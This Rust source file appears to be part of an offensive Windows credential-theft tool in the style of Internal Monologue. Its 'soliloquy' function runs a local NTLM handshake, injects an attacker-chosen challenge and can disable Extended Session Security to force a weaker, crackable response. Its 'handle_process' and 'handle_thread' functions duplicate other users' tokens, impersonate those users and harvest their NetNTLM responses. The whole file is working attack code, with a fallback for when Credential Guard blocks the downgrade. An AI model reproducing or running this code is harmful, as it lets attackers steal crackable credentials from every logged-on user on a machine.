use core::ptr::null_mut;

use alloc::string::String;
use alloc::vec;
use alloc::vec::Vec;
use libc_print::libc_println;

use crate::helper::{
    get_logon_sid, get_username, impersonate_logged_on_user, revert_to_self, validate_sid,
};
use crate::utils::hex_to_bytes;
use crate::win32::def::{
    SecurityImpersonationLevel, TokenType, HANDLE, NT_SUCCESS, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE,
    TOKEN_QUERY,
};
use crate::win32::ntdll::ntdll;
use crate::win32::psapi::nt_duplicate_token;
use crate::win32::sspicli::{
    sspi, SecBuffer, SecBufferDesc, SecHandle, TimeStamp, MAX_TOKEN_SIZE, SEC_E_OK,
    SEC_I_COMPLETE_AND_CONTINUE, SEC_I_CONTINUE_NEEDED,
};

use crate::types::NtlmResponse;

use crate::{_print, AUTHENTICATED_USERS};

#[cfg(feature = "verbose")]
use crate::win32::def::NT_STATUS;

#[cfg(feature = "threads")]
use crate::win32::def::{ClientId, ObjectAttributes, OBJ_INHERIT, THREAD_QUERY_INFORMATION};

/// Performs the NTLM authentication process.
///
/// This function executes the NTLM authentication protocol by interacting with the
/// Windows Security Support Provider Interface (SSPI). It simulates the NTLM authentication
/// process between a client and a server, modifies the challenge message, and extracts the
/// NetNTLM response.
///
/// # Steps
/// 1. **Acquire Credentials Handle**: Obtain a handle to the NTLM credentials for the current user.
/// 2. **Initialize Client Context**: Start the NTLM handshake by creating a client security context.
/// 3. **Accept Security Context**: Simulate the server's response by accepting the client's token.
/// 4. **Modify Challenge Message**: Apply the custom challenge provided and optionally disable ESS.
/// 5. **Complete Handshake**: Finalize the handshake by reinitializing the client context with the modified challenge.
/// 6. **Extract Response**: Retrieve the NetNTLM response from the final client token.
/// 7. **Clean Up**: Free all resources and security contexts.
///
/// # Parameters
/// - `challenge`: A hexadecimal string representing the challenge to be used in the NTLM protocol.
/// - `disable_ess`: A boolean flag indicating whether to disable the "Extended Session Security" (ESS) in the NTLM protocol.
///
/// # Returns
/// - `Some(NtlmResponse)` if the NTLM authentication process completes successfully, including the extraction of the NetNTLM response.
/// - `None` if any step fails, such as acquiring credentials, initializing/accepting the security context, or extracting the response.
#[allow(unused_variables)]
pub fn soliloquy(challenge: &str, disable_ess: bool) -> Option<NtlmResponse> {
    // Buffers for client and server tokens
    let mut client_buffer_vec = vec![0u8; MAX_TOKEN_SIZE];
    let mut client_pv_buffers = [SecBuffer::new(
        client_buffer_vec.as_mut_ptr() as *mut _,
        MAX_TOKEN_SIZE as u32,
    )];
    let mut client_token = SecBufferDesc::new(client_pv_buffers.as_mut_ptr());

    let mut server_buffer_vec = vec![0u8; MAX_TOKEN_SIZE];
    let mut server_pv_buffers = [SecBuffer::new(
        server_buffer_vec.as_mut_ptr() as *mut _,
        MAX_TOKEN_SIZE as u32,
    )];
    let mut server_token = SecBufferDesc::new(server_pv_buffers.as_mut_ptr());

    // Handles and context variables.
    let mut cred_handle = SecHandle::default();
    let mut client_context = SecHandle::default();
    let mut server_context = SecHandle::default();

    let mut lifetime: TimeStamp = TimeStamp::default();
    let mut context_attributes: u32 = 0;

    // Retrieve the current username
    let username = get_username();

    // Keep the Vec in a variable to ensure memory validity.
    let principal_utf16 = if username.is_empty() {
        None
    } else {
        Some(
            username
                .encode_utf16()
                .chain(core::iter::once(0))
                .collect::<Vec<u16>>(),
        )
    };

    // Get the pointer, ensuring the memory remains valid.
    let principal_ptr = match &principal_utf16 {
        Some(principal) => principal.as_ptr() as *mut u16,
        None => core::ptr::null_mut(),
    };

    let mut package = String::from("NTLM")
        .encode_utf16()
        .chain(core::iter::once(0))
        .collect::<Vec<u16>>();

    _print!("[+] Starting NTLM handshake");

    // Acquire a credentials handle for the NTLM package
    if let Some(aquire_credentials_handle_w) = unsafe { sspi().acquire_credentials_handle_w } {
        unsafe {
            let result = aquire_credentials_handle_w(
                principal_ptr,
                package.as_mut_ptr(),
                3, // SECPKG_CRED_BOTH
                core::ptr::null_mut(),
                core::ptr::null_mut(),
                core::ptr::null_mut(),
                core::ptr::null_mut(),
                &mut cred_handle,
                &mut lifetime,
            );

            if result != SEC_E_OK as i32 {
                _print!(
                    "[-] Step 1: Failed to acquire credentials handle. ({:#X})",
                    result
                );
                return None;
            }
            _print!(
                "[+] Step 1: Acquired credentials handle for user '{}'",
                username
            );
        }
    }

    // Initialize the client security context
    if let Some(initialize_security_context_w) = unsafe { sspi().initialize_security_context_w } {
        unsafe {
            let result = initialize_security_context_w(
                &mut cred_handle,
                core::ptr::null_mut(), // No previous context
                principal_ptr,
                0x00000800, // ISC_REQ_ALLOCATE_MEMORY
                0,
                0x10, // SECURITY_NATIVE_DREP
                core::ptr::null_mut(),
                0,
                &mut client_context,
                &mut client_token,
                &mut context_attributes,
                &mut lifetime,
            );

            if result != SEC_I_CONTINUE_NEEDED as i32
                && result != SEC_I_COMPLETE_AND_CONTINUE as i32
            {
                _print!(
                    "[-] Step 2: Failed to initialize client security context. ({:#X})",
                    result
                );
                return None;
            }

            _print!("[+] Step 2: Initialized client security context");
        }
    }

    // Accept the client token on the server side
    if let Some(accept_security_context) = unsafe { sspi().accept_security_context } {
        unsafe {
            let result = accept_security_context(
                &mut cred_handle,
                core::ptr::null_mut(),
                &mut client_token,
                0x00000800, //ISC_REQ_ALLOCATE_MEMORY
                0x10,       // SECURITY_NATIVE_DREP
                &mut server_context,
                &mut server_token,
                &mut context_attributes,
                &mut lifetime,
            );

            if result != SEC_I_CONTINUE_NEEDED && result != SEC_I_COMPLETE_AND_CONTINUE {
                _print!(
                    "[-] Step 3: Failed to accept client token on server side. ({:#X})",
                    result
                );
                return None;
            }

            _print!("[+] Step 3: Accepted client token on server side");
        }
    }

    // Modify the server challenge
    let sb_ptr = server_token.p_buffers;
    if sb_ptr.is_null() {
        _print!("[-] Error: Server token buffer pointer is null");
        return None;
    }

    let sb = unsafe { &mut *sb_ptr };
    let server_message = sb.as_slice();

    let challenge_bytes = hex_to_bytes(challenge);
    if challenge_bytes.is_none() {
        _print!("[-] Error: Failed to parse challenge bytes");
        return None;
    }

    if disable_ess {
        server_message[22] &= 0xF7; // Disable ESS by clearing the ESS flag
    }
    server_message[24..32].copy_from_slice(&challenge_bytes.unwrap()); // Inject custom challenge
    server_message[32..48].fill(0); // Zero out additional data

    let mut server_message_vec = server_message.to_vec();

    // Reinitialize client context with modified challenge
    let mut server_challenge_buffer = [SecBuffer::new(
        server_message_vec.as_mut_ptr() as *mut _,
        server_message_vec.len() as u32,
    )];
    let mut server_token = SecBufferDesc::new(server_challenge_buffer.as_mut_ptr());

    client_buffer_vec = vec![0u8; MAX_TOKEN_SIZE];
    client_pv_buffers = [SecBuffer::new(
        client_buffer_vec.as_mut_ptr() as *mut _,
        MAX_TOKEN_SIZE as u32,
    )];
    client_token = SecBufferDesc::new(client_pv_buffers.as_mut_ptr());

    if let Some(initialize_security_context_w) = unsafe { sspi().initialize_security_context_w } {
        unsafe {
            let result = initialize_security_context_w(
                &mut cred_handle,
                &mut client_context,
                principal_ptr,
                0x00000800,
                0,
                0x10,
                &mut server_token,
                0,
                &mut client_context,
                &mut client_token,
                &mut context_attributes,
                &mut lifetime,
            );

            if result != SEC_E_OK as i32 && disable_ess {
                _print!(
                    "[!] ESS disabled failed. Possible Credential Guard. Retrying with ESS enabled"
                );
                return soliloquy(challenge, false);
            }
        }
    }

    if client_token.p_buffers.is_null() {
        _print!("[-] Error: Client token response is invalid. Buffer pointer is null");
        return None;
    }

    // Extract the NetNTLM response
    let net_ntlm_response = client_token.as_bytes();
    if net_ntlm_response.is_none() {
        _print!("[-] Step 4: Failed to extract NetNTLM response");

        return None;
    }

    _print!("[+] Step 4: Completed NTLM handshake and extracted NetNTLM response");

    // Clean up resources
    unsafe {
        if let Some(free_credentials_handle) = sspi().free_credentials_handle {
            free_credentials_handle(&mut cred_handle);
        }

        if let Some(delete_security_context) = sspi().delete_security_context {
            delete_security_context(&mut client_context);
            delete_security_context(&mut server_context);
        }
    }

    // Convert the response into an NtlmResponse object
    match NtlmResponse::from_bytes(net_ntlm_response.unwrap().as_slice(), challenge) {
        Ok(response) => Some(response),
        Err(e) => {
            _print!("[-] Error: Failed to parse NTLM response: {}", e);
            None
        }
    }
}

/// Handles the NTLM authentication process for a specific target process.
///
/// This function attempts to impersonate the user associated with the provided process,
/// using its token to perform an NTLM authentication. It includes steps
/// for token validation, duplication, impersonation, and reverting to the original security context.
///
/// # Parameters
/// - `process_handle`: Handle to the target process.
/// - `challenge`: A string containing the NTLM challenge.
/// - `pid`: Process ID of the target process.
/// - `process_name`: Name of the target process.
///
/// # Returns
/// - `Some(NtlmResponse)` if the NTLM authentication process is successfully completed and the response is valid.
/// - `None` if any step fails, such as token validation, duplication, or NTLM challenge-response execution.
#[allow(unused_variables)]
pub fn handle_process(
    process_handle: HANDLE,
    challenge: &str,
    pid: u32,
    process_name: &str,
) -> Option<NtlmResponse> {
    let mut ntlm_response = NtlmResponse::default(); // Placeholder for the NTLM response
    let mut token: HANDLE = core::ptr::null_mut();

    // Step 1: Attempt to open the process token with TOKEN_QUERY access
    let mut nt_status = unsafe {
        ntdll()
            .nt_open_process_token
            .run(process_handle, TOKEN_QUERY, &mut token)
    };

    if NT_SUCCESS(nt_status) {
        // Retrieve the SID associated with the token
        let sid = get_logon_sid(token);
        unsafe { ntdll().nt_close.run(token) }; // Close the token handle after retrieving the SID

        if let Some(sid_value) = sid {
            // Step 2: Validate the retrieved SID
            if !validate_sid(&sid_value) {
                return None; // Exit early if the SID is invalid
            }

            // Step 3: Open the process token again with TOKEN_DUPLICATE access
            nt_status = unsafe {
                ntdll()
                    .nt_open_process_token
                    .run(process_handle, TOKEN_DUPLICATE, &mut token)
            };

            if NT_SUCCESS(nt_status) {
                let mut dup_token: HANDLE = null_mut();

                // Step 4: Duplicate the token for impersonation
                nt_status = nt_duplicate_token(
                    token,
                    SecurityImpersonationLevel::SecurityImpersonation as u32,
                    TOKEN_ALL_ACCESS,
                    TokenType::TokenImpersonation as u32,
                    &mut dup_token,
                );

                if NT_SUCCESS(nt_status) {
                    unsafe { ntdll().nt_close.run(token) }; // Close the original token handle

                    // Step 5: Impersonate the duplicated token
                    if NT_SUCCESS(impersonate_logged_on_user(dup_token)) {
                        _print!(
                            "[+] Successfully impersonated user: {}, process: {} ({})",
                            get_username(),
                            process_name,
                            pid
                        );

                        // Step 6: Perform the NTLM authentication challenge-response
                        match soliloquy(challenge, true) {
                            Some(valid_result) => {
                                unsafe { AUTHENTICATED_USERS.push(sid_value) }; // Track the authenticated user
                                ntlm_response = valid_result;
                            }
                            None => {
                                libc_println!(
                                    "[-] Error: Got blank response for user:{}",
                                    get_username()
                                );
                                // _print!(
                                //     "[-] Error: Got blank response for user:{}",
                                //     get_username()
                                // );
                            }
                        }

                        // Revert to the original security context
                        revert_to_self();
                    } else {
                        _print!("[-] Failed to impersonate user for process: {}", pid);
                    }

                    // Close the duplicated token handle
                    unsafe { ntdll().nt_close.run(dup_token) };
                } else {
                    // Log failure to duplicate the token
                    _print!(
                        "[-] Error: Token duplication failed for process: {} ({}), Status: {}",
                        process_name,
                        pid,
                        NT_STATUS(nt_status)
                    );
                    unsafe { ntdll().nt_close.run(token) }; // Ensure the original token is closed
                }
            }
            // } else {
            //     _print!(
            //         "[-] NtOpenProcessToken for duplication failed with status: {}, process id: {}",
            //         NT_STATUS(nt_status),
            //         pid
            //     );
            // }
        }
    }
    // } else {
    //     _print!(
    //         "[-] NtOpenProcessToken failed with status: {}, process id: {}",
    //         NT_STATUS(nt_status),
    //         pid
    //     );
    // }

    // Return the NTLM response if it is valid, otherwise return None
    if ntlm_response.is_valid() {
        Some(ntlm_response)
    } else {
        None
    }
}

/// Handles the NTLM authentication process for a specific thread.
///
/// This function attempts to impersonate the user associated with the provided thread by
/// duplicating its token and performing the NTLM authentication.
///
/// # Parameters
/// - `thread_id`: The ID of the target thread.
/// - `challenge`: A string containing the NTLM challenge.
///
/// # Returns
/// - `Some(NtlmResponse)` if the NTLM authentication process is successfully completed and the response is valid.
/// - `None` if any step fails, such as token validation, duplication, or NTLM challenge-response execution.
#[allow(unused_variables)]
#[cfg(feature = "threads")]
pub fn handle_thread(thread_id: u32, challenge: &str) -> Option<NtlmResponse> {
    let mut ntlm_response = NtlmResponse::default(); // Placeholder for the NTLM response
    let mut token: HANDLE = core::ptr::null_mut();
    let mut thread_handle: HANDLE = null_mut();

    let mut obj_attrs = ObjectAttributes {
        length: core::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: null_mut(),
        object_name: null_mut(),
        attributes: OBJ_INHERIT,
        security_descriptor: null_mut(),
        security_quality_of_service: null_mut(),
    };

    let mut client_id = ClientId {
        unique_process: null_mut(),
        unique_thread: thread_id as *mut core::ffi::c_void,
    };

    // Open a handle to the target thread
    let mut nt_status = unsafe {
        ntdll().nt_open_thread.run(
            &mut thread_handle,
            THREAD_QUERY_INFORMATION,
            &mut obj_attrs,
            &mut client_id,
        )
    };

    if !NT_SUCCESS(nt_status) || thread_handle.is_null() {
        _print!(
            "[-] Error: Unable to open thread token. Thread ID: {}, Status: {}",
            thread_id,
            NT_STATUS(nt_status)
        );
        return None;
    }

    // Open the thread's token
    nt_status = unsafe {
        ntdll()
            .nt_open_thread_token
            .run(thread_handle, TOKEN_QUERY, 1, &mut token)
    };

    if !NT_SUCCESS(nt_status) {
        _print!(
            "[-] Error: Unable to open thread token. Thread ID: {}, Status: {}",
            thread_id,
            NT_STATUS(nt_status)
        );
        unsafe { ntdll().nt_close.run(thread_handle) };
        return None;
    }

    if NT_SUCCESS(nt_status) {
        // Retrieve the SID associated with the token
        let sid = get_logon_sid(token);
        unsafe { ntdll().nt_close.run(token) };

        if let Some(sid_value) = sid {
            // Validate the SID
            if !validate_sid(&sid_value) {
                unsafe { ntdll().nt_close.run(thread_handle) };
                return None;
            }

            // Reopen the thread's token for duplication
            nt_status = unsafe {
                ntdll()
                    .nt_open_thread_token
                    .run(thread_handle, TOKEN_DUPLICATE, 1, &mut token)
            };

            if NT_SUCCESS(nt_status) {
                let mut dup_token: HANDLE = null_mut();

                // Duplicate the token for impersonation
                nt_status = nt_duplicate_token(
                    token,
                    SecurityImpersonationLevel::SecurityImpersonation as u32,
                    TOKEN_ALL_ACCESS,
                    TokenType::TokenPrimary as u32,
                    &mut dup_token,
                );

                if NT_SUCCESS(nt_status) {
                    unsafe { ntdll().nt_close.run(token) }; // Close the original token handle

                    // Perform impersonation using the duplicated token
                    if NT_SUCCESS(impersonate_logged_on_user(dup_token)) {
                        _print!(
                            "[+] Successfully impersonated user: {}, thread id: {}",
                            get_username(),
                            thread_id,
                        );

                        // Perform the NTLM authentication challenge-response
                        match soliloquy(challenge, true) {
                            Some(valid_result) => {
                                unsafe { AUTHENTICATED_USERS.push(sid_value) }; // Track the authenticated user
                                ntlm_response = valid_result;
                            }
                            None => {
                                libc_println!(
                                    "[-] Error: Got blank response for user:{}",
                                    get_username()
                                );
                            }
                        }

                        // Revert to the original security context
                        revert_to_self();
                    } else {
                        _print!(
                            "[-] Error: Unable to impersonate user for thread ID: {}. Status: {}",
                            thread_id,
                            NT_STATUS(nt_status)
                        );
                    }

                    unsafe { ntdll().nt_close.run(dup_token) }; // Close the duplicated token handle
                } else {
                    _print!(
                        "[-] Error: Failed to duplicate token for thread ID: {}. Status: {}",
                        thread_id,
                        NT_STATUS(nt_status)
                    );
                    unsafe { ntdll().nt_close.run(token) };
                }
            }
        }
    }

    unsafe { ntdll().nt_close.run(thread_handle) };

    if ntlm_response.is_valid() {
        Some(ntlm_response)
    } else {
        None
    }
}
